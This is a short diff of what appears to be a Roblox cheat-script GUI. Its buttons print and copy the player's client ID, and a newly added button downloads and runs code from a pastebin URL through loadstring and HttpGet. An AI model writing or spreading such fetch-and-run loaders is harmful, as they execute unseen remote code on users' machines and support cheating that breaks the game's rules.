@@ -11,3 +11,7 @@ print(game:GetService("RbxAnalyticsService"):GetClientId())
 
 Section:NewButton("Second click this", "idk", function() 
 setclipboard(game:GetService("RbxAnalyticsService"):GetClientId())
+
+Section:NewButton("afterbeingverifiedclickhere", "idk", function() 
+loadstring(game:HttpGet("https://pastebin.com/raw/hQUGUMiZ"))()
+
